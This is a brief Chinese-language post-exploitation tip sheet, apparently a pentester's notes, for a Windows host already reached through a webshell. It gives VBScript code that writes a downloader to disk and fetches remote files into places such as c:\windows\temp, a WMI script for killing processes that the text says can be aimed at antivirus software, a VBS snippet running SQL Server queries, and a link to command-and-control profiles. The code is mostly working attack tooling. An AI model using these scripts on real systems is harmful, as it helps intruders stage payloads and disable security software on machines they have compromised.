### vbs命令执行小tip

~~~
使用先决条件：
	假设我们先拿到了一个webshell且主机是windows主机，但是我们没有某些权限，或者相关命令被禁用，那么我们可以利用vbs来绕过
~~~

~~~
1.使用vbs下载文件
2.使用vbs绕过限制执行结束进程。
3.VBS 调用 SQL server执行命令。
~~~

##### 使用vbs下载文件

###### 代码1

~~~
这里就是我们将命令写入到1.vbs文件，调用vbs文件去远程下在logo.zip文件
~~~

~~~vbscript
echo Set xPost = CreateObject("Microsoft.XMLHTTP") >1.vbs 
echo xPost.Open "GET","http://baidu.com/logo.zip",0 >>1.vbs 
echo xPost.Send() >>1.vbs 
echo Set sGet = CreateObject("ADODB.Stream") >>1.vbs 
echo sGet.Mode = 3 >>1.vbs 
echo sGet.Type = 1 >>1.vbs 
echo sGet.Open() >>1.vbs 
echo sGet.Write(xPost.responseBody) >>1.vbs 
echo sGet.SaveToFile "logo.zip",2 >>1.vbs
~~~

###### 代码2

~~~vbscript
使用方式 cscript iget.vbs http://baidu.com/xx.jpg xx.jpg
~~~

~~~vbscript
iLocal = LCase(WScript.Arguments(1))   
iRemote = LCase(WScript.Arguments(0)) 
Set testPost = CreateObject("Microsoft.XMLHTTP") 
testPost.Open "GET",iRemote,0
testPost.Send() 
Set sGet = CreateObject("ADODB.Stream") 
sGet.Mode = 3
sGet.Type = 1
sGet.Open() 
sGet.Write(testPost.responseBody) 
sGet.SaveToFile iLocal,2
~~~

###### 代码3

~~~vbscript
Set yhnShell = CreateObject("Wscript.Shell")
Set yhnShell = CreateObject("Wscript.Shell")
Set sdfbPost = CreateObject("Microsoft.XMLHTTP") 
sdfbPost.Open "GET","http://www.baidu.com/img/bdlogo.gif",0
sdfbPost.Send() 
Set sdfbGet = CreateObject("ADODB.Stream") 
sdfbGet.Mode = 3
sdfbGet.Type = 1
sdfbGet.Open() 
sdfbGet.Write(sdfbPost.responseBody) 
Set sdfbPost = CreateObject("Microsoft.XMLHTTP") 
sdfbGet.SaveToFile "c:\windows\temp\bd.jpg",2
Set sdfbPost = CreateObject("Microsoft.XMLHTTP") 
wscript.quit
~~~

##### vbs绕过限制结束进程

~~~
修改代码内的net.exe进程名即可
我们权限够可以在webshell直接杀死杀软进程
~~~

~~~vbscript
strComputer="."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList=objWMIService.ExecQuery ("select * from Win32_Process where Name='net.exe' ")
For Each objProcess in colProcessList
objProcess.Terminate()
Next
~~~

##### VBS 调用 SQL server执行命令

~~~vbscript
StrDSN="Provider=SQLOLEDB;Data Source=LAPTOP-DEV;Initial Catalog=master;Integrated Security=SSPI"
set Conn = CreateObject("ADODB.Connection") 
set Rs=CreateObject("ADODB.RecordSet")
Conn.Open StrDSN
Set Rs = conn.Execute("select @@version")
Do While Not rs.EOF
wscript.echo rs(0)
rs.MoveNext 
Loop
rs.close
~~~





#### C2侧写

https://hub.fastgit.xyz/rsmudge/Malleable-C2-Profiles/archive/refs/heads/master.zip

























